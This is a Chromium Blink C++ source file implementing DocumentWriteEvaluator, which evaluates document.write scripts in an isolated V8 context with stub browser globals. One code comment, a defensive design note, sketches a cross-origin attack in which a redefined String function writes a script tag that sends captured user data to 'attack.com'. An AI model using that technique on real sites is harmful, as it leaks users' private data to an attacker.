// Copyright 2016 The Chromium Authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

#include "bindings/core/v8/DocumentWriteEvaluator.h"

#include "bindings/core/v8/ScriptSourceCode.h"
#include "bindings/core/v8/V8BindingMacros.h"
#include "bindings/core/v8/V8ScriptRunner.h"
#include "core/frame/Location.h"
#include "core/html/parser/HTMLParserThread.h"
#include "platform/TraceEvent.h"
#include "wtf/text/StringUTF8Adaptor.h"

#include <v8.h>

namespace blink {

namespace {

void documentWriteCallback(const v8::FunctionCallbackInfo<v8::Value>& args)
{
    void* ptr = v8::Local<v8::External>::Cast(args.Data())->Value();
    DocumentWriteEvaluator* evaluator = static_cast<DocumentWriteEvaluator*>(ptr);
    v8::HandleScope scope(args.GetIsolate());
    for (int i = 0; i < args.Length(); i++) {
        evaluator->recordDocumentWrite(toCoreStringWithNullCheck(args[i]->ToString()));
    }
}

} // namespace

DocumentWriteEvaluator::DocumentWriteEvaluator(const Document& document)
{
    // Note, evaluation will only proceed if |location| is not null.
    Location* location = document.location();
    if (location) {
        m_pathName = location->pathname();
        m_hostName = location->hostname();
        m_protocol = location->protocol();
    }
    m_userAgent = document.userAgent();
}

// For unit testing.
DocumentWriteEvaluator::DocumentWriteEvaluator(const String& pathName, const String& hostName, const String& protocol, const String& userAgent)
    : m_pathName(pathName)
    , m_hostName(hostName)
    , m_protocol(protocol)
    , m_userAgent(userAgent)
{
}

DocumentWriteEvaluator::~DocumentWriteEvaluator()
{
}

// Create a new context and global stubs lazily. Note that we must have a
// separate v8::Context per HTMLDocumentParser. Separate Documents cannot share
// contexts. For instance:
// Origin A:
// <script>
// var String = function(capture) {
//     document.write(<script src="http://attack.com/url=" + capture/>);
// }
// </script>
//
// Now, String is redefined in the context to capture user information and post
// to the evil site. If the user navigates to another origin that the preloader
// targets for evaluation, their data is vulnerable. E.g.
// Origin B:
// <script>
// var userData = [<secret data>, <more secret data>];
// document.write("<script src='/postData/'"+String(userData)+"' />");
// </script>
bool DocumentWriteEvaluator::ensureEvaluationContext()
{
    if (!m_persistentContext.isEmpty())
        return false;
    TRACE_EVENT0("blink", "DocumentWriteEvaluator::initializeEvaluationContext");
    ASSERT(m_persistentContext.isEmpty());
    v8::Isolate* isolate = V8PerIsolateData::mainThreadIsolate();
    v8::Isolate::Scope isolateScope(isolate);
    v8::HandleScope handleScope(isolate);
    v8::Local<v8::Context> context = v8::Context::New(isolate);
    m_persistentContext.set(isolate, context);
    v8::Context::Scope contextScope(context);

    // Initialize global objects.
    m_window.set(isolate, v8::Object::New(isolate));
    m_location.set(isolate, v8::Object::New(isolate));
    m_navigator.set(isolate, v8::Object::New(isolate));
    m_document.set(isolate, v8::Object::New(isolate));

    // Initialize strings that are used more than once.
    v8::Local<v8::String> locationString = v8String(isolate, "location");
    v8::Local<v8::String> navigatorString = v8String(isolate, "navigator");
    v8::Local<v8::String> documentString = v8String(isolate, "document");

    m_window.newLocal(isolate)->Set(locationString, m_location.newLocal(isolate));
    m_window.newLocal(isolate)->Set(documentString, m_document.newLocal(isolate));
    m_window.newLocal(isolate)->Set(navigatorString, m_navigator.newLocal(isolate));

    v8::Local<v8::FunctionTemplate> writeTemplate = v8::FunctionTemplate::New(isolate, documentWriteCallback, v8::External::New(isolate, this));
    writeTemplate->RemovePrototype();
    m_document.newLocal(isolate)->Set(locationString, m_location.newLocal(isolate));
    m_document.newLocal(isolate)->Set(v8String(isolate, "write"), writeTemplate->GetFunction());
    m_document.newLocal(isolate)->Set(v8String(isolate, "writeln"), writeTemplate->GetFunction());

    m_location.newLocal(isolate)->Set(v8String(isolate, "pathname"), v8String(isolate, m_pathName));
    m_location.newLocal(isolate)->Set(v8String(isolate, "hostname"), v8String(isolate, m_hostName));
    m_location.newLocal(isolate)->Set(v8String(isolate, "protocol"), v8String(isolate, m_protocol));
    m_navigator.newLocal(isolate)->Set(v8String(isolate, "userAgent"), v8String(isolate, m_userAgent));

    v8CallBoolean(context->Global()->Set(context, v8String(isolate, "window"), m_window.newLocal(isolate)));
    v8CallBoolean(context->Global()->Set(context, documentString, m_document.newLocal(isolate)));
    v8CallBoolean(context->Global()->Set(context, locationString, m_location.newLocal(isolate)));
    v8CallBoolean(context->Global()->Set(context, navigatorString, m_navigator.newLocal(isolate)));
    return true;
}

bool DocumentWriteEvaluator::evaluate(const String& scriptSource)
{
    TRACE_EVENT0("blink", "DocumentWriteEvaluator::evaluate");
    v8::Isolate* isolate = V8PerIsolateData::mainThreadIsolate();
    v8::Isolate::Scope isolateScope(isolate);
    v8::HandleScope handleScope(isolate);
    v8::Context::Scope contextScope(m_persistentContext.newLocal(isolate));

    // TODO(csharrison): Consider logging compile / execution error counts.
    StringUTF8Adaptor sourceUtf8(scriptSource);
    v8::MaybeLocal<v8::String> source = v8::String::NewFromUtf8(isolate, sourceUtf8.data(), v8::NewStringType::kNormal, sourceUtf8.length());
    if (source.IsEmpty())
        return false;
    v8::TryCatch tryCatch(isolate);
    return !V8ScriptRunner::compileAndRunInternalScript(source.ToLocalChecked(), isolate).IsEmpty();
}

bool DocumentWriteEvaluator::shouldEvaluate(const String& source)
{
    return !m_hostName.isEmpty() && !m_userAgent.isEmpty();
}

String DocumentWriteEvaluator::evaluateAndEmitWrittenSource(const String& scriptSource)
{
    if (!shouldEvaluate(scriptSource))
        return "";
    TRACE_EVENT0("blink", "DocumentWriteEvaluator::evaluateAndEmitStartTokens");
    m_documentWrittenStrings.clear();
    evaluate(scriptSource);
    return m_documentWrittenStrings.toString();
}

void DocumentWriteEvaluator::recordDocumentWrite(const String& documentWrittenString)
{
    m_documentWrittenStrings.append(documentWrittenString);
}

} // namespace blink
